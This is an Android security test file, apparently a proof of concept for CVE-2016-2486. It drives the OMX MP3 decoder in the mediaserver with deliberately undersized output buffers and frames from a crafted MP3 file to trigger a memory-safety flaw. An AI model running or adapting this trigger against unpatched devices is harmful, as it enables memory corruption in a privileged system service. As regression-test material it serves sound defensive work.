
/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions vand
 * limitations under the License.
 */

#include <OMX_Component.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <fcntl.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <stdio.h>

using namespace android;

class DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}
  virtual void onMessages(const std::list<omx_message> &) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

template <class T>
static void InitOMXParams(T *params) {
  memset(params, 0, sizeof(T));
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

IOMX::buffer_id *inBufferId = nullptr;
IOMX::buffer_id *outBufferId = nullptr;
int inFileFd = -1;

static int exit_test(int ret_code) {
  if (inBufferId != nullptr) {
    delete[] inBufferId;
  }
  if (outBufferId != nullptr) {
    delete[] outBufferId;
  }
  if (inFileFd >= 0) {
    close(inFileFd);
  }
  return ret_code;
}

int main() {
  sp<IServiceManager> sm = defaultServiceManager();

  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == nullptr) {
    ALOGE("mediaPlayerService == NULL");
    return EXIT_FAILURE;
  }

  sp<IOMX> service = mediaPlayerService->getOMX();
  if (service == nullptr) {
    ALOGE("service == NULL");
    return EXIT_FAILURE;
  }

  sp<DummyOMXObserver> observerEnc = new DummyOMXObserver();
  sp<DummyOMXObserver> observerDec = new DummyOMXObserver();

  List<sp<IMemory>> inQueue;
  List<sp<IMemory>> outQueue;
  List<IOMX::buffer_id> outBufferIdQueue;

  ALOGI("-----------decode------------");
  const char *name = "OMX.google.mp3.decoder";

  status_t err = OK;
  IOMX::node_id node = 0;

  if ((err = service->allocateNode(name, observerDec, nullptr, &node)) != OK) {
    ALOGE("%s node allocation fails", name);
    return EXIT_FAILURE;
  }

  int inMemSize = 4096;
  int outMemSize = 16;
  int inBufferCnt = 4;
  int outBufferCnt = 4;

  int inBufferSize = inMemSize / inBufferCnt;
  int outBufferSize = outMemSize / outBufferCnt;

  if ((inBufferId = new IOMX::buffer_id[inBufferCnt]) == nullptr) {
    ALOGE("new inBuffer failed");
    return EXIT_FAILURE;
  }

  if ((outBufferId = new IOMX::buffer_id[outBufferCnt]) == nullptr) {
    ALOGE("new outBuffer failed");
    return EXIT_FAILURE;
  }

  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);

  //
  // read frames from mp3 file
  //
  const char *inFileName = "/data/local/tmp/CVE-2016-2486.mp3";
  if ((inFileFd = open(inFileName, O_RDONLY)) < 0) {
    ALOGE("cannot open file: %s", inFileName);
    return exit_test(EXIT_FAILURE);
  }

  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    if (read(inFileFd, memory->pointer(), inBufferSize) == -1) {
      ALOGE("read %d bytes: failed", inBufferSize);
      return exit_test(EXIT_FAILURE);
    }

    if ((err = service->useBuffer(node, 0, memory, &inBufferId[i],
                                  inBufferSize)) != OK) {
      ALOGE("useBuffer 0, port index 0, err: %d", err);
      return exit_test(EXIT_FAILURE);
    }
  }

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    if ((err = service->useBuffer(node, 1, memory, &outBufferId[i],
                                  outBufferSize)) != OK) {
      ALOGE("useBuffer 0, port index 1, err: %d, mem: %p", err,
            memory->pointer());
      return exit_test(EXIT_FAILURE);
    }
  }

  // change state from loaded to idle
  if ((err = service->sendCommand(node, OMX_CommandStateSet, 2)) != OK) {
    ALOGE("sendCommand, err: %d", err);
    return exit_test(EXIT_FAILURE);
  }

  // change state from idle to executing
  if ((err = service->sendCommand(node, OMX_CommandStateSet, 3)) != OK) {
    ALOGE("sendCommand, err: %d", err);
    return exit_test(EXIT_FAILURE);
  }

  int fenceFd = -1;
  for (int i = 0; i < inBufferCnt; i++) {
    if ((err = service->emptyBuffer(node, inBufferId[i], 0, inBufferSize, 0, 0,
                                    fenceFd)) != OK) {
      ALOGE("emptyBuffer, err: %d", err);
      return exit_test(EXIT_FAILURE);
    }
  }

  for (int i = 0; i < outBufferCnt; i++) {
    if ((err = service->fillBuffer(node, outBufferId[i], fenceFd)) != OK) {
      ALOGE("fillBuffer, err: %d", err);
      return exit_test(EXIT_FAILURE);
    }
  }

  return exit_test(EXIT_SUCCESS);
}